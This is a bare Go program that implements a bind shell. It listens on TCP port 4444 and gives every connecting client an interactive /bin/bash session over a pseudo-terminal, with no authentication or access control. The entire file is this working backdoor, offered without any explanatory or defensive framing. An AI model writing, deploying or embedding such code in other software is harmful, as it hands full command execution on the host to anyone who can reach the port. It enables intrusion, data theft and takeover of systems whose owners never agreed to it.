package main

import (
	"io"
	"net"
	"os/exec"

	"github.com/creack/pty"
)

func main() {
	ln, err := net.Listen("tcp", ":4444")
	if err != nil {
		return
	}
	defer ln.Close()

	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go handle(conn)
	}
}

func handle(conn net.Conn) {
	defer conn.Close()

	cmd := exec.Command("/bin/bash")
	ptmx, err := pty.Start(cmd)
	if err != nil {
		return
	}
	defer ptmx.Close()

	go io.Copy(conn, ptmx)
	io.Copy(ptmx, conn)
}

